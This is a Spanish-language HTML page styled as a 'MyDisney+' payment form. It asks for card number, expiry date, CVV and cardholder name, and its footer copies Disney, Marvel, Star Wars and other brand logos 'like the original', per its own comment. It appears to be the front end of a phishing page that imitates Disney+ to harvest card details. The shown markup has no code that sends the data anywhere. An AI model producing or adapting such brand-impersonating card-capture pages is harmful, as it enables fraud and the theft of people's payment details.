<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pagar suscripción | MyDisney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #000;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

/* CONTENEDOR PRINCIPAL */
.container {
    max-width: 430px;
    margin: 0 auto;
    background: #111;
    padding: 30px 25px;
    margin-top: 35px;
    border-radius: 20px;
    border: 1px solid #1f1f1f;
}

/* TÍTULO */
h1 {
    font-size: 24px;
    margin-bottom: 4px;
    font-weight: 600;
}

.sub {
    color: #bbb;
    font-size: 15px;
    margin-bottom: 25px;
}

/* LABELS */
label {
    font-size: 13px;
    display: block;
    margin-bottom: 6px;
    color: #ddd;
}

/* INPUTS GENERALES */
input {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #333;
    border-radius: 6px;
    font-size: 15px;
    color: #fff;
}

/* INPUT TARJETA CON ICONOS */
.input-card {
    position: relative;
}

.input-card input {
    padding-right: 120px;
}

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 26px;
    opacity: .9;
}

/* FECHA + CVV LADO A LADO */
.row-double {
    display: flex;
    gap: 15px;
    margin-top: 15px;
}

.field-group {
    flex: 1;
}

/* BOTÓN PAGAR */
button {
    width: 100%;
    padding: 17px;
    background: #00C8FF;
    border: none;
    font-size: 16px;
    border-radius: 30px;
    margin-top: 25px;
    font-weight: 600;
    color: #000;
    cursor: pointer;
}

button:hover {
    opacity: .85;
}

/* FOOTER */
footer {
    margin-top: 45px;
    text-align: center;
    padding-bottom: 40px;
}

footer img {
    height: 32px;
    opacity: .6;
    margin: 6px;
}
</style>
</head>

<body>

<!-- CONTENEDOR DEL FORMULARIO -->
<div class="container">

    <h1>Agregar método de pago</h1>
    <p class="sub">Tu suscripción se renovará automáticamente.</p>

    <!-- NUMERO DE TARJETA -->
    <label>NÚMERO DE LA TARJETA</label>
    <div class="input-card">
        <input type="text" placeholder="•••• •••• •••• ••••">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <!-- FECHA Y CVV LADO A LADO -->
    <div class="row-double">

        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>CÓDIGO DE SEGURIDAD</label>
            <input type="text" placeholder="CVV" maxlength="4">
        </div>

    </div>

    <!-- NOMBRE -->
    <div style="margin-top:15px;">
        <label>NOMBRE DEL TITULAR</label>
        <input type="text" placeholder="Como aparece en la tarjeta">
    </div>

    <!-- BOTÓN -->
    <button>Agregar tarjeta</button>

</div>

<!-- FOOTER CON LOGOS COMO EL ORIGINAL -->
<footer>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney_wordmark.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/ABC_Network_logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/ESPN_wordmark.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/MarvelLogo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Star_Wars_Logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/National-Geographic-Logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Hulu_Logo.svg">
</footer>

</body>
</html>
